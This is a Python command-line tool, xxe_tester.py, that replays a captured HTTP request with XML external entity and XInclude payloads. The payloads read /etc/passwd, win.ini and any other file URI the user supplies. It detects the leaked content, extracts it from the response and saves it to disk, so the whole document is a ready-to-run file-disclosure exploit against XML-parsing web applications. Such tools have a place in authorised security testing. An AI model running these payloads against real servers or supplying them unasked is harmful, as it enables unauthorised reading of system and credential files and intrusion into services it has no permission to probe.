#!/usr/bin/env python3
# xxe_tester.py
import re, sys, argparse, requests, urllib.parse, difflib, pathlib
from requests.utils import default_user_agent

XXE_PAYLOADS = [
    ('xxe_passwd', '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name><password>test</password></root>'''),
    ('xxe_winini', '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<root><name>&xxe;</name><password>test</password></root>'''),
    ('xxe_param_passwd', '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % a SYSTEM "file:///etc/passwd">
  <!ENTITY % b "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
  %b;
]>
<root><name>&xxe;</name><password>test</password></root>'''),
    ('xinclude_passwd', '''<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <name><xi:include href="file:///etc/passwd" parse="text"/></name>
  <password>test</password>
</root>'''),
]

PASSWD_SIG = re.compile(r'(?m)^(root|daemon|bin):x?:\d+:\d+:', re.IGNORECASE)
WININI_SIG = re.compile(r'(?i)^\s*\[fonts\]|\[extensions\]|\[mci extensions\]', re.M)
XML_ERR_SIG = re.compile(r'(?i)(doctype|entity|xinclude|external entity|libxml|SAX|DTD)')

def parse_raw_request(raw: str):
    parts = raw.split('\r\n\r\n', 1)
    if len(parts) == 1: parts = raw.split('\n\n', 1)
    head = parts[0]
    body = parts[1] if len(parts) > 1 else ''
    lines = head.splitlines()
    reqline = lines[0].strip()
    method, path, _ = reqline.split()
    headers = {}
    for line in lines[1:]:
        if not line.strip() or ':' not in line: continue
        k, v = line.split(':', 1)
        headers[k.strip()] = v.strip()
    return method, path, headers, body

def build_url(headers, path, default_scheme='http'):
    host = headers.get('Host') or headers.get('host')
    if not host:
        raise ValueError('No Host header found.')
    scheme = default_scheme
    for key in ('Origin','origin','Referer','referer'):
        if key in headers:
            try:
                u = urllib.parse.urlparse(headers[key])
                if u.scheme in ('http','https'): scheme = u.scheme
            except: pass
    return f'{scheme}://{host}{path}', host

def prep_headers(orig_headers):
    drop = {'Content-Length','content-length','Host','host','Accept-Encoding','accept-encoding','Connection','connection'}
    headers = {k:v for k,v in orig_headers.items() if k not in drop}
    headers.setdefault('User-Agent', default_user_agent())
    headers['Content-Type'] = 'application/xml'
    return headers

def summarize_result(resp_text, baseline_text):
    findings = []
    if PASSWD_SIG.search(resp_text): findings.append('/etc/passwd content detected')
    if WININI_SIG.search(resp_text): findings.append('win.ini content detected')
    if XML_ERR_SIG.search(resp_text): findings.append('Parser error mentions DTD/entity/XInclude (hardening clues)')
    diff_ratio = difflib.SequenceMatcher(None, baseline_text, resp_text).quick_ratio()
    if diff_ratio < 0.6 and len(resp_text) > len(baseline_text)+100:
        findings.append('Response changed significantly vs baseline')
    return findings

def sanitize_filename(s: str) -> str:
    s = s.replace('file://', '').lstrip('/').replace(':', '_').replace('\\','_').replace('/', '_')
    return re.sub(r'[^A-Za-z0-9._-]+', '_', s) or 'extracted'

def extract_injected_content(resp_text):
    m = re.search(r'<name>(.*?)</name>', resp_text, re.S | re.I)
    return m.group(1).strip() if m else None

def ensure_dir(path: str):
    p = pathlib.Path(path); p.mkdir(parents=True, exist_ok=True); return p

def save_text(path: pathlib.Path, content: str):
    with open(path, 'w', encoding='utf-8', errors='ignore') as f:
        f.write(content)

def run_request(method, url, headers, data, timeout):
    return requests.request(method, url, headers=headers, data=data.encode('utf-8'), timeout=timeout, allow_redirects=True)

def build_raw_request(method, path, host, headers, body):
    # headers: dict WITHOUT Host/Content-Length; we’ll add both
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    for k, v in headers.items():
        if k.lower() in ('host','content-length'): continue
        lines.append(f"{k}: {v}")
    body_bytes = body.encode('utf-8')
    lines.append(f"Content-Length: {len(body_bytes)}")
    return "\r\n".join(lines) + "\r\n\r\n" + body

def maybe_emit_raw(tag, raw_req, mode, findings, is_extra):
    """
    mode: 'none' | 'extras' | 'success' | 'all'
    """
    should = (
        (mode == 'all') or
        (mode == 'extras' and is_extra) or
        (mode == 'success' and any('detected' in f or 'changed significantly' in f for f in findings))
    )
    if should:
        req_dir = ensure_dir('out/requests')
        path = req_dir / f'{sanitize_filename(tag)}.http'
        save_text(path, raw_req)
        print("----- RAW REQUEST USED -----")
        print(raw_req)
        print("----------------------------")
        print(f"  → raw saved to {path}")

def main():
    ap = argparse.ArgumentParser(description='XXE/XInclude tester from a raw HTTP request, with extraction and raw-request output.')
    ap.add_argument('-f','--file', help='Path to file with the raw HTTP request (else stdin).')
    ap.add_argument('--timeout', type=float, default=8.0)
    ap.add_argument('--extra', action='append', default=[], help='Extra file URI(s), e.g. file:///etc/passwd')
    ap.add_argument('--print', dest='do_print', action='store_true', help='Print extracted content preview to stdout.')
    ap.add_argument('--raw', choices=['none','extras','success','all'], default='extras',
                    help='When to print/save raw HTTP requests (default: extras).')
    args = ap.parse_args()

    raw = open(args.file,'rb').read().decode('utf-8', 'replace') if args.file else sys.stdin.read()
    method, path, headers_in, body = parse_raw_request(raw)
    url, host = build_url(headers_in, path)
    base_headers = prep_headers(headers_in)

    # Baseline
    baseline_headers = dict(base_headers)
    if body.strip().startswith('<?xml'):
        baseline_headers['Content-Type'] = 'application/xml'
    try:
        r0 = run_request(method, url, baseline_headers, body, args.timeout)
        baseline_text = r0.text
        print(f'[baseline] {r0.status_code} {len(baseline_text)} bytes')
        raw_sent = build_raw_request(method, path, host, baseline_headers, body)
        maybe_emit_raw('baseline', raw_sent, args.raw, [], is_extra=False)
    except Exception as e:
        baseline_text = ''
        print(f'[baseline] request error: {e}')

    # Standard probes
    for name, payload in XXE_PAYLOADS:
        try:
            r = run_request(method, url, base_headers, payload, args.timeout)
            text = r.text
            findings = summarize_result(text, baseline_text)
            status = 'LIKELY VULN' if any('detected' in f for f in findings) else ('INTERESTING' if findings else 'no obvious signal')
            print(f'\n[{name}] → {r.status_code} {len(text)} bytes → {status}')
            for f in findings: print(f'  - {f}')
            raw_sent = build_raw_request(method, path, host, base_headers, payload)
            maybe_emit_raw(name, raw_sent, args.raw, findings, is_extra=False)
        except Exception as e:
            print(f'\n[{name}] request error: {e}')

    # Extras → extract and save
    for extra in args.extra:
        payload = f'''<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "{extra}"> ]>
<root><name>&xxe;</name><password>test</password></root>'''
        tag = f'xxe_extra_{extra}'
        try:
            r = run_request(method, url, base_headers, payload, args.timeout)
            text = r.text
            findings = summarize_result(text, baseline_text)
            print(f'\n[{tag}] → {r.status_code} {len(text)} bytes')
            for f in findings: print(f'  - {f}')

            injected = extract_injected_content(text)
            content_to_save = injected if injected else text
            stem = sanitize_filename(extra)
            out_dir = ensure_dir('out')
            outpath = out_dir / f'{stem}.txt'
            save_text(outpath, content_to_save)
            preview = (content_to_save[:400] + '...') if len(content_to_save) > 400 else content_to_save
            print(f'  → saved to {outpath}')
            if args.do_print:
                print('----- BEGIN EXTRACT -----')
                print(preview if injected else '(full response)\n' + preview)
                print('----- END EXTRACT -----')

            raw_sent = build_raw_request(method, path, host, base_headers, payload)
            maybe_emit_raw(tag, raw_sent, args.raw, findings, is_extra=True)

        except Exception as e:
            print(f'\n[{tag}] request error: {e}')

if __name__ == '__main__':
    main()
